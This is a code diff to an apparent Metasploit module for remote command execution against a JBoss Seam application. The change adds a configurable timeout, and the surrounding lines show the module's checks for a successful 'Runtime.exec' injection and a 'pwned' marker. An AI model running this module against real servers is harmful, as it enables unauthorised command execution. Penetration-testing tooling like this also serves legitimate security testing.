@@ -39,9 +39,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam']),
-        OptString.new('CMD', [ true, "The command to execute."])
+        OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam' ]),
+        OptString.new('CMD', [ true, "The command to execute." ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 20 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 20
   end
 
   def run
@@ -63,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
         {
           'uri'    => req,
           'method' => 'GET',
-        }, 20)
+        }, timeout)
 
       if (res and res.headers['Location'] =~ %r(java.lang.Runtime.exec\%28java.lang.String\%29))
         flag_found_one = index
@@ -86,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
         {
           'uri'    => req,
           'method' => 'GET',
-        }, 20)
+        }, timeout)
 
 
       if (res and res.headers['Location'] =~ %r(pwned=java.lang.UNIXProcess))
